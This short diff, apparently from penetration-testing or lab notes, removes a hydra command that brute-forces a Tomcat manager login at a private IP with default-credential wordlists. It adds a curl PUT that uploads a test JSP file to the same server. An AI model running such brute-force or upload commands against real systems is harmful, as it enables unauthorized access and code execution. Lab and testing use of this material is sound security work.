@@ -1,3 +1,2 @@
-hydra -L /usr/share/wordlists/metasploit/tomcat_mgr_default_users.txt \
--P /usr/share/wordlists/metasploit/tomcat_mgr_default_pass.txt \
--s 8080 172.17.17.118 http-get /manager/html
+curl -X PUT http://172.17.17.118:8080/test.jsp \
+--data '<% out.println("hello"); %>'
